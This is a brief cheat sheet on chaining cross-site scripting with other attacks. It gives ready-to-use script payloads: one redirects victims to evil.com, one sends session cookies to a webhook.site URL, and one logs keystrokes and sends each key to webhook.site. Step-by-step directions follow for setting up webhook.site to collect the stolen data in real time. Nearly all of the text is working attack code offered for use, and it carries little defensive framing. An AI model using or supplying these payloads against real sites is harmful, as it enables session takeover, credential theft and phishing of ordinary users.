                                                                                                  XSS Chaining


•	XSS chaining means combining XSS with other vulnerabilities or attack vectors to increase the impact.

1. Open Redirect
Use XSS to redirect the victim to a malicious site: 
•	<script>location="https://evil.com/"</script>
🔁 This can be used for phishing, token theft, or chaining with other attacks.

2. Session Hijacking
Use XSS to steal cookies or session tokens:
•	<script>fetch("https://webhook.site/your-id?cookie=" + document.cookie);</script>

•	 The stolen cookie will be sent to your Webhook.site URL, allowing potential session takeover if cookies aren't secured.

3. Keylogger via XSS
You can use XSS to log keystrokes from the victim’s browser:
•	<script> document.onkeypress = function(e) { fetch("https://webhook.site/id?key=" + encodeURIComponent(e.key)); } </script>


How to Use Webhook.site for XSS Payloads
1.	Visit 🔗 https://webhook.site
2.	It will generate a unique Webhook URL (ID) like:
https://webhook.site/your-custom-id
3.	Use this URL in your XSS payload.
4.	Go back to Webhook.site, and you'll see the captured data in real-time.
